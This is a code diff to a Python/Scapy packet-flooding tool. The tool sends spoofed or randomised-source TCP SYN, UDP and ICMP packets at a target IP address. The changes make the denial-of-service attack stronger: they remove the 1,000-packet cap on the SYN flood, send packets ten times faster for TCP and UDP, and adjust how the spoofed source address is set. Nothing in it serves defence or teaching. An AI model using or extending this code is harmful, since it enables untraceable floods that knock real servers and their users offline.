@@ -59,7 +59,7 @@ def validate_port_number(port):
 # Set source IP
 def set_source_ip(is_spoof_ip):
    src_IP = ""
-   is_random_ip = -1
+   is_random_ip = False
    if is_spoof_ip == 1:
       while True:
          src_IP = input("Enter IP address of Source: ")
@@ -147,13 +147,13 @@ def send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port
       if ip_proto == 1:
          TCP1 = TCP(sport = source_port, dport = destination_port, flags = 'S')
          pkt = IP1 / TCP1
-         send(pkt, inter = .00001, count = 1000)
+         send(pkt, inter = .000001)
          return
 
       if ip_proto == 2:
          UDP1 = UDP(sport = source_port, dport = destination_port)
          pkt = IP1 / UDP1
-         send(pkt, inter = .00001)
+         send(pkt, inter = .000001)
          return
    else:
       pkt = IP1 / ICMP()
@@ -214,7 +214,8 @@ while True:
    # source_port = rand_port()
 
    if is_random_ip == True:
-      source_ip = rand_ip()
+      if source_ip == "":
+         source_ip = rand_ip()
       IP1 = IP(src = source_ip, dst = target_ip)
       send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port, is_random_dst_port)
    else:
